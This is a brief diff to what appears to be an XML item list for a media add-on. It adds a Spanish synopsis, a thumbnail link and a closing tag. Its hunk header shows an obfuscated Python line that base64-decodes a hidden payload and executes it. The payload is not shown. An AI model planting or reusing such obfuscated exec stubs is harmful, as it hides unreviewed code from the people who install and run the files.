@@ -93,7 +93,9 @@ eval(compile(base64.b64decode(eval('\x6e\x65\x6f')),'<string>','exec'))
 ]]></expres>
 <page></page>
 </regex>
-<info></info>
-<thumbnail></thumbnail>
+<info>Un grupo de huérfanos dotados de poderes es reclutado por un benefactor excéntrico para ir a una misión secreta.</info>
+<thumbnail>https://i.imgur.com/WoaWwqT.jpg</thumbnail>
 <fanart>https://i.imgur.com/yNfc6m7.jpg</fanart>
 </item>
+
+</items>
